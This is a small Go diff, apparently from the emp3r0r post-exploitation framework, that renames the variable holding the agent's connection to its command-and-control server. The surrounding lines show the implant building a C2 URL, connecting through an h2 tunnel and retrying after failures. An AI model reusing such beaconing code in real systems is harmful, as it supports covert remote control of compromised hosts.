@@ -279,7 +279,7 @@ connect:
 	// connect to MsgAPI, the JSON based h2 tunnel
 	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
-	emp3r0r_data.H2Json = conn
+	emp3r0r_data.CCMsgConn = conn
 	if err != nil {
 		log.Println("ConnectCC: ", err)
 		time.Sleep(5 * time.Second)
